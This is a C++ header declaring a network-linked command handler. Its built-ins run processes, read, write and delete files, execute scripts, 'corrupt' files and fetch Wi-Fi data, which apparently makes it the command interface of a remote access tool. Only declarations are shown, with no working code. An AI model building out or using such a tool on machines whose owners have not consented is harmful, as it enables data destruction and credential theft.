#ifndef COMMAND_HANDLER_H
#define COMMAND_HANDLER_H

#include "Platform.h"
#include "Network.h"
#include <map>
#include <functional>
#include <memory>
#include <map>
#include <algorithm>

class CommandHandler
{
public:
    using CommandFunc = std::function<std::string(const std::string &)>;

private:
    std::map<std::string, CommandFunc> commands;
    std::unique_ptr<Platform::IPlatform> platform;

public:
    CommandHandler();

    // Register a new command
    void registerCommand(const std::string &name, CommandFunc func);

    // Execute a command
    std::string execute(const std::string &commandLine);

    // Get list of available commands
    std::string getHelp() const;

private:
    // Built-in commands
    std::string cmdListProcesses(const std::string &args);
    std::string cmdStartProcess(const std::string &args);
    std::string cmdKillProcess(const std::string &args);
    std::string cmdProcessInfo(const std::string &args);
    std::string cmdSystemInfo(const std::string &args);
    std::string cmdListDirectory(const std::string &args);
    std::string cmdReadFile(const std::string &args);
    std::string cmdWriteFile(const std::string &args);
    std::string cmdExecuteScript(const std::string &args);
    std::string cmdHelp(const std::string &args);
    std::string cmdDeleteFile(const std::string &args);
    std::string cmdCorruptFile(const std::string &args);
    std::string cmdGetWifi(const std::string &args);
    // Utility functions
    std::pair<std::string, std::string> parseCommand(const std::string &commandLine);
};

#endif // COMMAND_HANDLER_H